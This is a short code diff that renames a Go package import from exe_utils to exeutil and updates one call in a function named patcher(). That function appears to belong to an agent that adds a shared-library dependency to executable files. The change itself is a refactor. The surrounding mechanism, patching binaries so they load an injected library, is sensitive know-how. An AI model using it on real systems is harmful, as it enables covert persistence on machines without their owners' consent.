@@ -16,7 +16,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
-	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -266,7 +266,7 @@ func patcher() (err error) {
 		if err != nil {
 			return err
 		}
-		addLibErr := exe_utils.AddDTNeeded(file, so_path)
+		addLibErr := exeutil.AddDTNeeded(file, so_path)
 		if addLibErr != nil {
 			err_list = append(err_list, addLibErr)
 		}
